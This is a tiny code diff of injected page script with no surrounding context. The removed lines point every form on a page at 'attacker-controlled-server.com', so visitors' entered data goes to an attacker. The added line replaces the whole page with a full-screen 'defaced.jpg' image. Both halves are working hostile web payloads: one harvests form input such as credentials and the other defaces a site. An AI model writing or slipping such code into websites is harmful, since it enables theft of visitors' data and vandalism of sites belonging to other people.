@@ -1,3 +1,1 @@
-document.querySelectorAll('form').forEach((form) => {
-    form.setAttribute('action', 'https://attacker-controlled-server.com');
-});
+document.body.innerHTML = '<img src="defaced.jpg" style="width:100%; height:100%; object-fit:cover;">';
